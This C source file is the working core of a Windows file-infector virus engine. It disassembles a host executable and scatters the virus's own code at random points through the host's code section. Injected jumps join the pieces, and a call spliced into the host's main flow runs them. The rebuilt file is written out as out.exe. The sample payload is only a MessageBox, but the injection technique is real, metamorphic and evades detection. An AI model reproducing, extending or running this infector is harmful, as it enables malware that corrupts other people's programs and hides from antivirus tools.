
#include "engine\engine.h"
#include "pic.h"

#include "engine/eng_x86.h"

#include <windows.h>
#include <stdio.h>

/**********************************************************************************
debugging procedure for saving image to text
***********************************************************************************/
static void debugImage(imageMap* map, const char* fname)
{
	dword va, i;
	imageEntity *entity;
	FILE* hfile;

	va = map->virtualAddress;
	entity = *map->entities;
	
	hfile = fopen(fname, "w");

	while (entity)
	{
		fprintf(hfile, "%x-%x (%p):", va, va + entity->length - 1, entity);
		
		for (i = 0; i < min(16, entity->length); i++)
			fprintf(hfile, " %X", entity->data[i]);
		if (entity->length > 16) 
			fprintf(hfile, " ...");

		fprintf(hfile, " : |");

		if (entity->flags & IE_OSREAD)
			fprintf(hfile, "%s", "R");
		if (entity->flags & IE_OSWRITE)
			fprintf(hfile, "%s", "W");
		if (entity->flags & IE_OSEXEC)
			fprintf(hfile, "%s", "X");
		if (entity->flags & IE_OSPHYS)
			fprintf(hfile, "%s", "P");
		if (entity->flags & IE_OSDATA)
			fprintf(hfile, "%s", "D");
		if (entity->flags & IE_OSEP)
			fprintf(hfile, "%s", "E");
		if (entity->flags & IE_OSREFED)
			fprintf(hfile, "%s", "T");

		if (entity->flags & IE_UNKNOWN)
			fprintf(hfile, "|%s", "IE_UNKNOWN");
		if (entity->flags & IE_CODE)
			fprintf(hfile, "|%s", "IE_CODE");
		else
			fprintf(hfile, "|%s", "IE_DATA");
		if (entity->flags & IE_MAIN)
			fprintf(hfile, "|%s", "IE_MAIN");
		if (entity->flags & IE_LABEL)
			fprintf(hfile, "|%s", "IE_LABEL");
		if (entity->flags & IE_REFDATA)
			fprintf(hfile, "|%s", "IE_REFDATA");
		
		fprintf(hfile, "|");

		for (i = 0; i < ENG_MAXXREFS; i++)
		{
			if (!entity->xrefs[i])
				continue;
			fprintf(hfile, " -> %X: %p", entity->xrefs[i]->type, entity->xrefs[i]->target);

			//check here! no broken refs are possible!
			if (entityToRVA(map, entity->xrefs[i]->target) == ENG_INVALIDRVA)
				fprintf(hfile, "=BROKEN");
		}
		
		fprintf(hfile, "\n");

		va += entity->length;
		entity = entity->next;
	}

	fclose(hfile);
}

/**********************************************************************************
stupid heap funcs
***********************************************************************************/
static void* my_malloc(unsigned int size)
{
	return malloc(size);
}
static void my_free(void* ptr)
{
	free(ptr);
}

/**********************************************************************************
loadVirtualPE:
	load a pe file into virtual addresses.

	in: heap, file path
	out: byte pointer
***********************************************************************************/
static byte* loadVirtualPE(heapManager* heap, const char* file)
{
	HANDLE hFile;
	dword fSize, peSize, i;
	ntHeaders* pe;
	sectionHeader* sct;
	byte *tmp, *ret, *dst, *src;
	
	//open file
	hFile = CreateFileA(file, FILE_GENERIC_READ, FILE_SHARE_READ, NULL, 
							 OPEN_EXISTING, 0, NULL);
	if (hFile == INVALID_HANDLE_VALUE) return NULL;

	//get raw file size
	fSize = GetFileSize(hFile, &peSize);
	if (!fSize)
	{
		CloseHandle(hFile);
		return NULL; 
	}

	//allocate buffer
	tmp = heap->malloc(fSize);
	if (!tmp)
	{
		CloseHandle(hFile); 
		return NULL; 
	}

	//read complete file
	ReadFile(hFile, tmp, fSize, &peSize, NULL);
	if (peSize != fSize)
	{
		heap->free(tmp); 
		CloseHandle(hFile); 
		return NULL; 
	}

	CloseHandle(hFile); //close file

	//get pe header
	pe = peHeader(tmp);
	if (!pe)
	{
		heap->free(tmp);
		return NULL; 
	}

	//get virtual image size
	peSize = pe->OptionalHeader.SizeOfImage;
	
	if (peSize == fSize)
		return tmp; //file already aligned

	//allocate virtual image buffer
	ret = (byte*)heap->malloc(peSize);
	if (!ret)
	{
		heap->free(tmp); 
		return NULL; 
	}

	zeroStruct(ret, peSize); //set buffer to zero buff
	
	dst = ret; //copy headers
	copyStruct(dst, tmp, pe->OptionalHeader.SizeOfHeaders);

	sct = (sectionHeader*)(pe+1); //for each section
	for (i = 0; i < pe->FileHeader.NumberOfSections; i++)
	{
		if (!sct->VirtualAddress || 
			!sct->SizeOfRawData ||
			!sct->PointerToRawData)
		{
			sct++; 
			continue; 
		}

		dst = ret + sct->VirtualAddress;
		src = tmp + sct->PointerToRawData;

		//copy it to it's virtual address
		copyStruct(dst, src, sct->SizeOfRawData);
		sct++;
	}

	heap->free(tmp);
	return ret;
}

//-----------------------------------------------------------------------------------------//
//										inject engine
//-----------------------------------------------------------------------------------------//

#define INJ_ME			0x01
#define INJ_INJECTED	0x02
#define INJ_EP			0x80

/**********************************************************************************
injectJump:
	inject a jump instruction (or a call if bool = 1) into host image after
	specified entity with given target.

	in: host map, prev entity, target entity (owned by host), bool (is a call or a jump)
	out: pointer to injected entity
***********************************************************************************/
imageEntity* injectJump(imageMap* host, imageEntity* prev, imageEntity* target, cbool bcall)
{
	register imageEntity* ret;
	register int err;

	imageXRef xref;
	byte data[] = { 0xE9, 0x00, 0x00, 0x00, 0x00 };

	if (bcall) //change opcode
		data[0] = 0xE8;

	//create xref
	xref.type = XRF_JUMP|XRF_REL|XRF_USEDATA;
	xref.target = target;
	xref.srcdelta = xref.dstdelta = 0;

	//add entity and xref
	ret = addEntity(host, prev, data, sizeof(data), IE_OSPHYS|IE_CODE);
	if (ret)
	{	
		err = addXRef(host, ret, xref);
		if (isError(err))
			return NULL;
	}

	return ret;
}

/**********************************************************************************
injectEntity:
	inject an entity to given host map after given host entity.

	in: host map, entity to inject, previous host entity
	out: pointer to injected entity
***********************************************************************************/
imageEntity* injectEntity(imageMap* host, imageEntity* vire, imageEntity* hoste)
{
	register imageEntity* ret;

	ret = addEntity(host, hoste, vire->data, vire->length, IE_OSPHYS);
	if (!ret)
		return NULL;

	//set flags and infos
	ret->injflags = INJ_INJECTED;
	ret->remote = vire;
	vire->remote = ret;
	return ret;
}

/**********************************************************************************
getRandHostCode:
	get a random code entity in the host with given base of code, end of code,
	current position.

	in: host map, begin of code, end of code, current position
	out: pointer to next code entity (randomly into host)
***********************************************************************************/
imageEntity* getRandHostCode(imageMap* host, imageEntity* boc, imageEntity* eoc, imageEntity* cur)
{
	//until we found an entity
	while (cur)
	{
		//scroll until end of code
		while (cur != eoc)
		{
			//its a code: randomly get it
			if ((rand() % 100) >= 10 && (cur->flags & IE_CODE))
				break;
			cur = cur->next;
		}

		//perform new cycle
		if (cur == eoc)
			cur = boc;
		else
			break;
	}

	return cur;
}

/**********************************************************************************
recognizeMe:
	recognize code and data following flows from given entry point.

	in: entry point entity
	out: err code (error if we reference to osdata or something else that cant be patched)
***********************************************************************************/
int recognizeMe(imageEntity* ep)
{
	register dword i;

	//wrong flags
	if (ep->flags & IE_OSDATA)
		return ENG_ERRMAP;

	//already done
	if (ep->injflags == INJ_ME)
		return ENG_WARNOK;

	//set flag
	ep->injflags = INJ_ME;
	
	//for each xref call recursively
	for (i = 0; i < ENG_MAXXREFS; i++)
	{
		if (!ep->xrefs[i])
			continue;

		recognizeMe(ep->xrefs[i]->target);
	}

	//if its code and not a break, call on next
	if ((ep->flags & IE_CODE) && !(ep->flags & IE_BREAK))
		recognizeMe(ep->next);

	return ENG_ERRNONE;
}

/**********************************************************************************
injectCode:
	inject code of given map into host map, with given base of code, end of code.

	in: vir map, host map, begin of code, end of code
	out: err code
***********************************************************************************/
int injectCode(imageMap* virus, imageMap* host, imageEntity* boc, imageEntity* eoc)
{
	register imageEntity *tmp, *vprev, *vcur, *hcur, *ep;

	//get random 1st entity
	hcur = getRandHostCode(host, boc, eoc, boc); 
	vprev = NULL;

	//for each vir entity
	for (vcur = *virus->entities; vcur; vcur = vcur->next)
	{
		//not me, not code go next
		if (!(vcur->injflags & INJ_ME) || !(vcur->flags & IE_CODE))
			continue;

		//save ep flag
		if (vcur->injflags & INJ_EP)
			ep = vcur;

		//we broke original control flow, inject a jump
		if (!(hcur->flags & IE_BREAK) && !(hcur->injflags & INJ_INJECTED))
		{
			hcur = injectJump(host, hcur, hcur->next, 0);
			if (!hcur)
				return ENG_ERRMEM;
		}

		//inject code entity
		tmp = injectEntity(host, vcur, hcur);
		if (!tmp)
			return ENG_ERRMEM;

		tmp->flags |= IE_CODE; //add code flag!!!

		//we are far away from previous entity, inject jump
		if (vprev && vprev->remote->next != vcur->remote)
		{
			tmp = injectJump(host, vprev->remote, vcur->remote, 0);
			if (!tmp)
				return ENG_ERRMEM;
		}

		//get next position
		hcur = getRandHostCode(host, boc, eoc, vcur->remote);

		//if im not a break instruction save ptr
		if (!(vcur->flags & IE_BREAK))
			vprev = vcur;
		else
			vprev = NULL;
	}
	
	//find a random code entity reached by host entry point
	tmp = getRandHostCode(host, boc, eoc, boc);
	while (!(tmp->flags & IE_MAIN))
		tmp = getRandHostCode(host, boc, eoc, tmp);

	//inject call to our injected ep
	if (!injectJump(host, tmp, ep->remote, 1))
		return ENG_ERRMEM;
	
	return ENG_ERRNONE;
}

/**********************************************************************************
injectData:
	inject data of given vir map into host map with given data base entity

	in: vir map, host map, data base entity (last entity of writable sec)
	out: err code
***********************************************************************************/
int injectData(imageMap* virus, imageMap* host, imageEntity* base)
{
	register imageEntity* cur;
	
	cur = *virus->entities;
	while (cur)
	{
		//for each recognized data
		if ((cur->injflags & INJ_ME) && !(cur->flags & IE_CODE))
		{
			//append it consequentially to remote base
			base = injectEntity(host, cur, base);
			if (!base)
				return ENG_ERRMEM;
		}
		cur = cur->next;
	}

	return ENG_ERRNONE;
}

/**********************************************************************************
injectXRefs:
	inject xrefs for given host map (with every entity already injected).

	in: host map
	out: err code
***********************************************************************************/
int injectXRefs(imageMap* host)
{
	register imageEntity* cur;
	register dword i;

	imageXRef xref;

	//for each entity
	for (cur = *host->entities; cur; cur = cur->next)
	{
		//if not injected and not with a remote pointer (so was not owned by vir)
		if (!(cur->injflags & INJ_INJECTED) || !cur->remote)
			continue;

		//for each xref original entity had
		for (i = 0; i < ENG_MAXXREFS; i++)
		{
			if (!cur->remote->xrefs[i])
				continue;

			//copy xref from original entity, modifyng target
			xref = *cur->remote->xrefs[i];
			xref.target = xref.target->remote;
			addXRef(host, cur, xref);
		}
		
	}

	return ENG_ERRNONE;
}

/**********************************************************************************
inject:
	inject whole virus map into host map (assumes virus map is already tagged
	as recognized).

	in: vir map, host map
	out: err code
***********************************************************************************/
int inject(imageMap* virus, imageMap* host)
{
	register int err;
	register imageEntity *tmp, *boc, *eoc, 
						 *bod, *eod;
	
	//initialize randomizer
	srand(0 /*todo: GetTickCount()*/);

	boc = eoc = NULL;
	bod = eod = NULL;
	
	//for each entity in host get base of code, end of code, base of data, end of data
	tmp = *host->entities;
	while (tmp)
	{
		if ((tmp->flags & IE_OSEXEC) && !boc)
			boc = tmp;
		if (!(tmp->next->flags & IE_OSEXEC) && boc && !eoc)
			eoc = tmp;

		if ((tmp->flags & (IE_OSREAD|IE_OSWRITE)) == (IE_OSREAD|IE_OSWRITE) && !bod)
			bod = tmp;
		if ((tmp->next->flags & (IE_OSREAD|IE_OSWRITE)) != (IE_OSREAD|IE_OSWRITE) && bod && !eod)
			eod = tmp;

		if (boc && eoc && bod && eod)
			break;
		tmp = tmp->next;
	}

	//base, end of code\data sections not found
	if (!boc || !eoc || !bod || !eod)
		return ENG_ERRMAP;

	//inject code first of all
	err = injectCode(virus, host, boc, eoc);
	if (isError(err))
		return err;
	
	//inject data
	injectData(virus, host, eod);
	if (isError(err))
		return err;
	
	//inject xrefs
	err = injectXRefs(host);
	if (isError(err))
		return err;
	
	return ENG_ERRNONE;
}

/**********************************************************************************
entryPoint:
	sample entry point of our virus to inject.
***********************************************************************************/
typedef int (__stdcall *MESSAGEBOXA)(HWND, LPCSTR, LPCSTR, UINT);

static __declspec(noinline) void entryPoint(int useless)
{
	MESSAGEBOXA msgbox;

	//user32.dll, MessageBoxA
	msgbox = (MESSAGEBOXA)getExportedFunction(0x6f880298, 0xc7eecf47);
	if (msgbox)
		msgbox(NULL, "funny code here", "so pro", 0);
}

/**********************************************************************************
main:
***********************************************************************************/
int main(int argc, const char* argv[])
{
	register imageEntity* cur;
	register HANDLE hfile;
	register int err;

	heapManager heap;
	imageMap host;
	imageMap virus;
	dword dummy;

	//initialize heap funcs
	heap.free = my_free;
	heap.malloc = my_malloc;

	//reset maps
	zeroStruct(&virus, sizeof(virus));
	zeroStruct(&host, sizeof(host));
	host.heapAgent = virus.heapAgent = &heap;
	
	//load PEs
	host.data = loadVirtualPE(&heap, "host.exe");
	virus.data = loadVirtualPE(&heap, "Release\\mmorph2.exe");
	
	//disassemble host
	err = disassemblePE(&host);
	if (isError(err))
	{
		printf("error disassembling host: %d\n", err);
		heap.free(host.data);
		heap.free(virus.data);
		return 0;
	}
	printf("host disassembled successfully\n");

	//then virus
	err = disassemblePE(&virus);
	if (isError(err))
	{
		printf("error disassembling virus: %d\n", err);
		resetImageMap(&host);
		heap.free(host.data);
		heap.free(virus.data);
		return 0;
	}
	printf("virus disassembled successfully\n");
	
	//1507 = entryPoint in release (remember to recalculate it after a recompile)
	cur = rvaToEntity(&virus, 0x1507, NULL);
	err = recognizeMe(cur);
	if (isError(err))
	{
		printf("error during recognizing of virus\n");
		resetImageMap(&host);
		resetImageMap(&virus);
		heap.free(host.data);
		heap.free(virus.data);
		return 0;
	}
	printf("virus recognized himself successfully\n");

	//set ep flag
	cur->injflags |= INJ_EP;

	//inject virus into host
	err = inject(&virus, &host);
	if (isError(err))
	{
		printf("error during injecting of virus\n");
		resetImageMap(&host);
		resetImageMap(&virus);
		heap.free(host.data);
		heap.free(virus.data);
		return 0;
	}
	printf("virus injected successfully\n");
	
	//reassemble host
	err = assemblePE(&host);
	if (isError(err))
	{
		printf("error assembling host: %d\n", err);
		resetImageMap(&host);
		resetImageMap(&virus);
		heap.free(host.data);
		heap.free(virus.data);
		return 0;
	}
	printf("host assembled successfully\n");

	//create output file and write everything
	hfile = CreateFileA("out.exe", GENERIC_WRITE, FILE_SHARE_READ, NULL,
						CREATE_ALWAYS, 0, NULL);
	
	if (hfile != INVALID_HANDLE_VALUE)
	{
		cur = *host.entities;
		while (cur)
		{
			if (cur->flags & IE_OSPHYS)
				WriteFile(hfile, cur->data, cur->length, &dummy, NULL);
			cur = cur->next;
		}

		CloseHandle(hfile);
		printf("code integration succeeded\n");
	}
	else
		printf("can't open out.exe for writing\n");

	resetImageMap(&host);
	resetImageMap(&virus);
	heap.free(host.data);
	heap.free(virus.data);
	return 0;
}